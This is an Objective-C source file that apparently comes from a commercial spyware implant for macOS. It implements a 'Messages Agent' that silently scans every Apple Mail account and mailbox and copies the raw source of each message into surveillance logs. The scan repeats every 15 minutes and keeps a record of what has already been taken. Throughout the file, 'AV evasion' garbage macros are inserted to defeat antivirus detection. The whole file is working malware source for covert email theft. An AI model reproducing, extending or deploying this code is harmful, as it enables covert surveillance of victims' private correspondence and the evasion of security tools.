/*
 * RCSMAgentMessages.m
 * RCSMac 
 * Messages Agent
 *
 *
 * Created by J on 06/03/2014
 *
 * Copyright (C) HT srl 2014. All rights reserved
 *
 */

/*
 * The agent captures Apple Mail only.
 * The agent uses Apple Scripting Bridge to interact with Apple Mail.
 * When the agent starts, a first scan is immediately performed; 
 * then, a new scan is performed every 15 minutes.
 * Apple mail running status is countinously checked because ASB starts
 * the application to fullfill the requests.
 */

#import "RCSMAgentMessages.h"
#import "RCSNativeMail.h"
#import "RCSMCommon.h"
#import "RCSMTaskManager.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"


static __m_MAgentMessages *sharedAgentMessages = nil;

@interface __m_MAgentMessages (private)


- (void) _writeLog:(NSString*)rawMail andSender:(NSString*)sender;
- (void) _getMail;
- (NSData*)createLogHeaderWithSize:(NSInteger)logSize andSender:(NSString*)sender;
- (void) _getMarkup;
- (void) _setMarkup;

@end

@implementation __m_MAgentMessages (private)

- (void) _getMarkup
{
    markup = [[__m_MUtils sharedInstance] getPropertyWithName:[[self class] description]];
    if(markup==nil)
    {
        // markup not found, we allocate it
        markup = [NSMutableDictionary dictionaryWithCapacity: 100];
    }
}

- (void) _setMarkup
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

    [[__m_MUtils sharedInstance] setPropertyWithName:[[self class] description]withDictionary:markup];
    
    [pool release];
}

- (NSData*)createLogHeaderWithSize:(NSInteger)logSize andSender:(NSString*) sender
{
    NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(messagesAdditionalHeader)];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    messagesAdditionalHeader *additionalHeader = (messagesAdditionalHeader *)[logHeader bytes];;
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    additionalHeader->size    = logSize;
    additionalHeader->version = MAIL_VERSION2; //MAPI_V2_0_PROTO;
    additionalHeader->flags  = MAIL_FULL_BODY;
    if(sender != nil)
    {
        if ([sender rangeOfString:inAddr options:NSCaseInsensitiveSearch].location == NSNotFound)
        {
            // sender it's not me, it's an incoming message
            additionalHeader->flags |= MAIL_INCOMING;
        }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    NSDate *now = [NSDate date];
    NSTimeInterval unixTime = [now timeIntervalSince1970];
    int64_t winTime = (unixTime * RATE_DIFF) + EPOCH_DIFF;
    additionalHeader->lowDatetime = winTime & 0xFFFFFFFF;
    additionalHeader->highDatetime = (winTime >> 32) & 0xFFFFFFFF;
    additionalHeader->program = PROGRAM_MAIL;
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    return [logHeader autorelease];
}


- (void) _writeLog: (NSString*)rawMail andSender:(NSString*)sender
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSMutableData *contentData = [NSMutableData dataWithData:[rawMail dataUsingEncoding:NSUTF8StringEncoding ]];
    
    NSData *additionalHeaderData = [self createLogHeaderWithSize:[contentData length] andSender: sender];
    
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
    
    BOOL success = [logManager createLog: AGENT_MESSAGES
                             agentHeader: additionalHeaderData
                               withLogID: 0];
    
    if (success)
    {
    
        [logManager writeDataToLog: contentData
                          forAgent: AGENT_MESSAGES
                         withLogID: 0];
        // AV evasion: only on release build
        AV_GARBAGE_001
    
        [logManager closeActiveLog: AGENT_MESSAGES
                     withLogID: 0];
    
        // AV evasion: only on release build
        AV_GARBAGE_004

    }
    
    [pool release];
}

- (void) _getMail
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    mailApplication *appleMail =[SBApplication applicationWithBundleIdentifier:@"com.apple.mail"];
    
    if (![appleMail isRunning])
    {
        [pool release];
        return;
    }
    
    // retrieve accounts
    mailAccount *accounts = [appleMail accounts];
    for (mailAccount *account in accounts)
    {
        NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
        
        if (![appleMail isRunning])
        {
            [self _setMarkup]; // save markup and return
            [inner release];
            [pool release];
            return;
        }
        // retrieve mail addr associated to the account
        NSArray *mailAddrs = [account emailAddresses];
        inAddr = [mailAddrs objectAtIndex:0];
            
        // retrieve mailboxes
        mailMailbox *mailboxes = [account mailboxes];
        for (mailMailbox *mbox in mailboxes)
        {
            NSAutoreleasePool *inner2 = [[NSAutoreleasePool alloc] init];
            if (![appleMail isRunning])
            {
                [self _setMarkup]; // save markup and return
                [inner2 release];
                [inner release];
                [pool release];
                return;
            }
            // retrieve messages
            mailMessage *msgs = [mbox messages];
            for (mailMessage *msg in msgs)
            {
                NSAutoreleasePool *inner3 = [[NSAutoreleasePool alloc] init];
                // check if agent has been stopped
                if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
                       || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
                {
                    // save markup and return
                    [self _setMarkup];
                    [inner3 release];
                    [inner2 release];
                    [inner release];
                    [pool release];
                    return;
                }
                if (![appleMail isRunning])
                {
                    [self _setMarkup]; // save markup and return
                    [inner3 release];
                    [inner2 release];
                    [inner release];
                    [pool release];
                    return;
                }
                // take a bunch of data
                NSDate *mailDate = msg.dateReceived;
                if (![appleMail isRunning])
                {
                    [self _setMarkup]; // save markup and return
                    [inner3 release];
                    [inner2 release];
                    [inner release];
                    [pool release];
                    return;
                }
                NSInteger msgSize = msg.messageSize;
                NSNumber *key = [NSNumber numberWithInteger:msg.id];
                if (![appleMail isRunning])
                {
                    [self _setMarkup]; // save markup and return
                    [inner3 release];
                    [inner2 release];
                    [inner release];
                    [pool release];
                    return;
                }
                NSString *msgId = msg.messageId;
                //verify date range
                if (([mailDate compare:dateFrom] == NSOrderedDescending) && ([mailDate compare:dateTo] == NSOrderedAscending))
                    //mailDate later than dateFrom and earlier then dateTo
                {
                    // verify size range
                    if(msgSize <= size)
                    {
                        /*
                        if (![appleMail isRunning])
                        {
                            [self _setMarkup]; // save markup and return
                            return;
                        }
                        NSString *rawMail = msg.source;
                         */
                        if (![appleMail isRunning])
                        {
                            [self _setMarkup]; // save markup and return
                            [inner3 release];
                            [inner2 release];
                            [inner release];
                            [pool release];
                            return;
                        }
                        NSString *sender = msg.sender;
                        // verify markup
                        NSString *obj=[markup objectForKey:key];
                        if(obj == nil)
                        {
                            // there's no markup
                            if (![appleMail isRunning])
                            {
                                [self _setMarkup]; // save markup and return
                                [inner3 release];
                                [inner2 release];
                                [inner release];
                                [pool release];
                                return;
                            }
                            NSString *rawMail = msg.source;
                            [markup setObject:msgId forKey:key];
                            [self _writeLog:rawMail andSender:sender];
                        }
                        else
                        {
                            // there's a markup, if same msg id we do nothing
                            // else, id has been recycled and we have to log
                            // the msg and save markup
                            if ([obj isEqualToString:msgId] == NO)
                            {
                                if (![appleMail isRunning])
                                {
                                    [self _setMarkup]; // save markup and return
                                    [inner3 release];
                                    [inner2 release];
                                    [inner release];
                                    [pool release];
                                    return;
                                }
                                NSString *rawMail = msg.source;
                                [markup setObject:msgId forKey:key];
                                [self _writeLog:rawMail andSender:sender];
                            } // else we do nothing
                        }
                    }
                }
                [inner3 release];
            }
            [inner2 release];
        }
        [inner release];
    }
    // write markup to file at the end of the big loop
    [self _setMarkup];
    
    [pool release];
}

@end


@implementation __m_MAgentMessages

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentMessages *)sharedInstance
{
    @synchronized(self)
    {
        if (sharedAgentMessages == nil)
        {
            //
            // Assignment is not done here
            //
            [[self alloc] init];
        }
    }
    
    return sharedAgentMessages;
}

+ (id)allocWithZone: (NSZone *)aZone
{
    @synchronized(self)
    {
        if (sharedAgentMessages == nil)
        {
            sharedAgentMessages = [super allocWithZone: aZone];
            
            //
            // Assignment and return on first allocation
            //
            return sharedAgentMessages;
        }
    }
    
    // On subsequent allocation attemps return nil
    return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
    return self;
}

- (unsigned)retainCount
{
    // Denotes an object that cannot be released
    return UINT_MAX;
}

- (id)retain
{
    return self;
}

- (void)release
{
    // Do nothing
}

- (id)autorelease
{
    return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -


- (BOOL)stop
{

    int internalCounter = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [mConfiguration setObject: AGENT_STOP
                       forKey: @"status"];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    while (![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED]
           && internalCounter <= MAX_STOP_WAIT_TIME)
    {
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        internalCounter++;
        usleep(100000);
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    
    return YES;
}

- (void)start
{
    NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
    
    NSTimer *timer = nil;
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [mConfiguration setObject: AGENT_RUNNING forKey: @"status"];
    
    // read config data
    NSMutableDictionary *data = [mConfiguration objectForKey: @"data"];
    NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
    NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
    [inFormat setTimeZone:timeZone];
    [inFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss"];
    dateTo = [inFormat dateFromString: [data objectForKey: @"dateto"]];
    dateFrom = [inFormat dateFromString: [data objectForKey: @"datefrom"]];
    [inFormat release];
    size = [[data objectForKey:@"maxsize"] integerValue];

    // read markup data
    [self _getMarkup];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    // start the first run of email grabbing
    [self _getMail];
    
    if (gOSMajor == 10 && gOSMinor >= 7)
    {
        timer = [NSTimer scheduledTimerWithTimeInterval: 900 target:self selector:@selector(_getMail) userInfo:nil repeats:YES];
        [[NSRunLoop currentRunLoop] addTimer: timer forMode: NSRunLoopCommonModes];
    }
    else
    {
        // TODO: decide what to do here
        
    }
    
    NSRunLoop *currentRunLoop = [NSRunLoop currentRunLoop];
    
    while (![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOP]
           && ![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED])
    {
        NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
        
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        if (gOSMajor == 10 && gOSMinor >= 7)
            [currentRunLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
        else
            sleep(1);
        
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        [inner release];
    }
    
    
    if (gOSMajor == 10 && gOSMinor >= 7)
    {
        if (timer != nil)
            [timer invalidate];
    }
    else
    {
        // Remove our observer
        //[[NSDistributedNotificationCenter defaultCenter] removeObserver: self];
    }
    
    if ([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP])
    {
        // AV evasion: only on release build
        AV_GARBAGE_006
        
        [mConfiguration setObject: AGENT_STOPPED
                           forKey: @"status"];
        
        // AV evasion: only on release build
        AV_GARBAGE_003
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [outerPool release]; 
}


- (BOOL)resume
{
    return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)mConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    return mConfiguration;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    if (aConfiguration != mConfiguration)
    {
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        [mConfiguration release];
        
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        mConfiguration = [aConfiguration retain];
    }
}

@end
